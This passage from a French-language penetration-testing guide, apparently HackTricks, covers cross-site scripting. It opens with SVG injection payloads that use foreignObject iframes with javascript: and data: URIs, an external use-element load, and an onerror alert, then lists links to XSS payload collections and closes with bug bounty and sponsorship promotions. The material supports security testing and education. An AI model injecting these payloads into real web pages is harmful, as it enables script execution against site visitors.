<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Trouvez **plus de charges utiles SVG** dans [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Astuces JS diverses et informations pertinentes

{% content-ref url="other-js-tricks.md" %}
[other-js-tricks.md](other-js-tricks.md)
{% endcontent-ref %}

## Ressources XSS

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
* [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
* [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)

### OUTILS XSS

Trouvez quelques [**outils pour XSS ici**](xss-tools.md)**.**

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce de prime de bug** : **inscrivez-vous** sur **Intigriti**, une plateforme premium de **prime de bug créée par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) dès aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
